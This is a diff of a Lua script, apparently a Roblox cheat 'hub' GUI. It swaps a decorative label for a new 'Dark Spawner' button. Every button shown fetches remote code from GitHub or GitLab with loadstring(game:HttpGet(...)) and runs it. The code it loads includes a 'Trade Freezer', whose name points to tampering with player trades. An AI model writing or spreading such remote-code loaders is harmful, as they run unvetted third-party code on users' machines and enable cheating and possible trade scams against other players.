@@ -150,40 +150,16 @@ end
 
 --// Buttons
 createButton("Zysume Hub", function()
-	loadstring(game:HttpGet("https://raw.githubusercontent.com/ZusumeHub/ZusumeHub/refs/heads/main/UpdateZysume"))()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/ZusumeHub/ZusumeHub/refs/heads/main/UpdateZysume"))()
 end)
 
 createButton("Trade Freezer", function()
-	loadstring(game:HttpGet("https://raw.githubusercontent.com/GlazeScripts/TradeFreezerV1/refs/heads/main/GlazeHub.lua"))()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/GlazeScripts/TradeFreezerV1/refs/heads/main/GlazeHub.lua"))()
 end)
 
---// Info Message with Electric Blue Pulse
-local InfoLabel = Instance.new("TextLabel")
-InfoLabel.Parent = MainFrame
-InfoLabel.Size = UDim2.new(1, -20, 0, 30)
-InfoLabel.BackgroundTransparency = 1
-InfoLabel.Text = "MORE WILL BE ADDED SOON!"
-InfoLabel.TextColor3 = Color3.fromRGB(0, 170, 255)
-InfoLabel.TextStrokeTransparency = 0.5
-InfoLabel.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
-InfoLabel.TextSize = 14
-InfoLabel.Font = Enum.Font.GothamBold
-InfoLabel.LayoutOrder = 998
-
--- Electric Blue Pulse Animation
-task.spawn(function()
-	while true do
-		for i = 0, 1, 0.02 do
-			local g = 170 + (85 * i)
-			InfoLabel.TextColor3 = Color3.fromRGB(0, g, 255)
-			task.wait(0.05)
-		end
-		for i = 1, 0, -0.02 do
-			local g = 170 + (85 * i)
-			InfoLabel.TextColor3 = Color3.fromRGB(0, g, 255)
-			task.wait(0.05)
-		end
-	end
+createButton("Dark Spawner", function()
+    local Spawner = loadstring(game:HttpGet("https://gitlab.com/darkiedarkie/dark/-/raw/main/Spawner.lua"))()
+    Spawner.Load()
 end)
 
 --// Footer
